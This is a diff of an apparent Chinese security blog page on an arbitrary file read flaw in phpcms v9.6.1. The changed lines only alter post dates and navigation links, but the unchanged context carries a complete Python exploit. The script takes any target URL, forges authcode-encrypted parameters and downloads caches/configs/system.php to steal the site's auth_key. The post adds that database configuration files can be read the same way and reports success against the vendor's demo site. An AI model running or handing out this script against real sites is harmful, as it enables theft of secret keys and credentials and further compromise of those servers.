@@ -73,16 +73,16 @@
 <meta name="keywords" content="web,php,代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="phpcmsv9.6.1任意文件读取漏洞">
-<meta property="og:url" content="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/index.html">
+<meta property="og:url" content="http://yoursite.com/2017/04/29/phpcmsv9-6-1任意文件读取漏洞/index.html">
 <meta property="og:site_name" content="Answer">
 <meta property="og:description" content="漏洞危害通过利用该漏洞可以读取配置文件，获取authkey，可以进行高危恶意操. 漏洞触发点\phpcms\modules\content\down.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function download() &amp;#123;	$a_k =">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png">
-<meta property="og:updated_time" content="2017-09-23T13:58:38.000Z">
+<meta property="og:image" content="http://yoursite.com/2017/04/29/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png">
+<meta property="og:updated_time" content="2017-09-23T17:29:18.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpcmsv9.6.1任意文件读取漏洞">
 <meta name="twitter:description" content="漏洞危害通过利用该漏洞可以读取配置文件，获取authkey，可以进行高危恶意操. 漏洞触发点\phpcms\modules\content\down.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function download() &amp;#123;	$a_k =">
-<meta name="twitter:image" content="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png">
+<meta name="twitter:image" content="http://yoursite.com/2017/04/29/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png">
 
 
 
@@ -112,7 +112,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/04/29/phpcmsv9-6-1任意文件读取漏洞/"/>
 
 
 
@@ -235,7 +235,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/29/phpcmsv9-6-1任意文件读取漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Answer">
@@ -264,8 +264,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-23T21:48:13+08:00">
-                2017-09-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-29T21:48:13+08:00">
+                2017-04-29
               </time>
             
 
@@ -323,7 +323,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public function swfupload_json() &#123;</div><div class="line">		$arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]);</div><div class="line">		$arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;]));</div><div class="line">		$arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;]));</div><div class="line">		$json_str = json_encode($arr);</div><div class="line">		$att_arr_exist = param::get_cookie(&apos;att_json&apos;);</div><div class="line">		$att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist);</div><div class="line">		if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</div><div class="line">			return true;</div><div class="line">		&#125; else &#123;</div><div class="line">			$json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str;</div><div class="line">			echo $json_str;</div><div class="line">			param::set_cookie(&apos;att_json&apos;,$json_str);</div><div class="line">			return true;</div></pre></td></tr></table></figure>
 <p>##利用代码</p>
 <figure class="highlight plain"><figcaption><span>-*- coding:utf-8 -*-</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">import requests </div><div class="line">import re</div><div class="line">import hashlib</div><div class="line">import math</div><div class="line">import time</div><div class="line">import base64</div><div class="line"></div><div class="line"></div><div class="line">def microtime(get_as_float = False) :</div><div class="line">    if get_as_float:</div><div class="line">        return time.time()</div><div class="line">    else:</div><div class="line">        return &apos;%.8f %d&apos; % math.modf(time.time())</div><div class="line"></div><div class="line">def get_authcode(string, key = &apos;&apos;):</div><div class="line">    ckey_length = 4</div><div class="line">    key = hashlib.md5(key).hexdigest()</div><div class="line">    keya = hashlib.md5(key[0:16]).hexdigest()</div><div class="line">    keyb = hashlib.md5(key[16:32]).hexdigest()</div><div class="line">    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]</div><div class="line"></div><div class="line">    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()</div><div class="line"> </div><div class="line">    key_length = len(cryptkey)</div><div class="line">    string = &apos;0000000000&apos; + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string</div><div class="line">    string_length = len(string)</div><div class="line">    result = &apos;&apos;</div><div class="line">    box = range(0, 256)</div><div class="line">    rndkey = dict()</div><div class="line">    for i in range(0,256):</div><div class="line">        rndkey[i] = ord(cryptkey[i % key_length])</div><div class="line">    j=0</div><div class="line">    for i in range(0,256):</div><div class="line">        j = (j + box[i] + rndkey[i]) % 256</div><div class="line">        tmp = box[i]</div><div class="line">        box[i] = box[j]</div><div class="line">        box[j] = tmp</div><div class="line">    a=0</div><div class="line">    j=0</div><div class="line">    for i in range(0,string_length):</div><div class="line">        a = (a + 1) % 256</div><div class="line">        j = (j + box[a]) % 256</div><div class="line">        tmp = box[a]</div><div class="line">        box[a] = box[j]</div><div class="line">        box[j] = tmp</div><div class="line">        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))</div><div class="line">    return keyc + base64.b64encode(result).replace(&apos;=&apos;, &apos;&apos;).replace(&apos;+&apos;, &apos;-&apos;).replace(&apos;/&apos;, &apos;_&apos;)</div><div class="line"></div><div class="line">def poc(url):</div><div class="line">    md5 = lambda k:hashlib.md5(k).hexdigest()</div><div class="line">    getauth = lambda c,k:get_authcode(get_authcode(c,md5(&apos;login&apos;+md5(k+&apos;8.8.8.8&apos;))),k)</div><div class="line">    headers = &#123;&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,     </div><div class="line">        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;,</div><div class="line">        &quot;X-Forwarded-For&quot;:&quot;8.8.8.8&quot;,</div><div class="line">        &#125;</div><div class="line">    s = requests.get(url=url+&apos;/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1&apos;,headers=headers)</div><div class="line">    cookie_pre = [key for key in s.cookies.keys() if &apos;siteid&apos; in key][0][:-7]</div><div class="line">    userid = s.cookies[cookie_pre+&apos;_siteid&apos;]</div><div class="line">    s = requests.post(url=url+&apos;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;filename=test.jpg&amp;src=%26i%3D3%26d%3D1%26t%3D9999999999%26catid%3D1%26ip%3D8.8.8.8%26m%3D3%26modelid%3D3%26s%3Dcaches%2fconfigs%2fsystem.p%26f%3Dh%25253Cp%26xxxx%3D&apos;,</div><div class="line">       data=&#123;&apos;userid_flash&apos;: userid&#125;,headers=headers)</div><div class="line">    att_json = s.cookies[cookie_pre+&apos;_att_json&apos;]</div><div class="line">    s = requests.get(url=url+&apos;/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&apos;+att_json,headers=headers)</div><div class="line">    pattern = &apos;&lt;a.*?href=&quot;(.*?)&quot;.*?&gt;.*?&lt;/a&gt;&apos;</div><div class="line"></div><div class="line">    downlink = re.search(pattern, s.content).group(1)</div><div class="line">    s = requests.get(url+&apos;/index.php&apos;+downlink,headers=headers)</div><div class="line">    print s.content</div><div class="line">    </div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    url=raw_input(&apos;input url : &apos;)</div><div class="line">    poc(url)</div></pre></td></tr></table></figure>
-<h2 id="读取phpcms的demo站的auth-key文件成功"><a href="#读取phpcms的demo站的auth-key文件成功" class="headerlink" title="读取phpcms的demo站的auth_key文件成功"></a>读取phpcms的demo站的auth_key文件成功</h2><p><img src="/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png" alt=""><br>当然不止auth_key，还可以读数据库配置文件，等等之类的。</p>
+<h2 id="读取phpcms的demo站的auth-key文件成功"><a href="#读取phpcms的demo站的auth-key文件成功" class="headerlink" title="读取phpcms的demo站的auth_key文件成功"></a>读取phpcms的demo站的auth_key文件成功</h2><p><img src="/2017/04/29/phpcmsv9-6-1任意文件读取漏洞/E7AA0122-2E65-41B7-ABDC-710914DDE83D.png" alt=""><br>当然不止auth_key，还可以读数据库配置文件，等等之类的。</p>
 
       
     </div>
@@ -358,8 +358,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/05/26/某些环境下绕过php后缀黑名单上传webshell/" rel="next" title="某些环境下绕过php后缀黑名单上传webshell">
-                <i class="fa fa-chevron-left"></i> 某些环境下绕过php后缀黑名单上传webshell
+              <a href="/2017/04/12/phpcmsq前台注入分析/" rel="next" title="phpcms_v9.6.0前台注入分析">
+                <i class="fa fa-chevron-left"></i> phpcms_v9.6.0前台注入分析
               </a>
             
           </div>
@@ -367,10 +367,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/23/phpcmsq前台注入分析/" rel="prev" title="phpcms_v9.6.0前台注入分析">
-                phpcms_v9.6.0前台注入分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
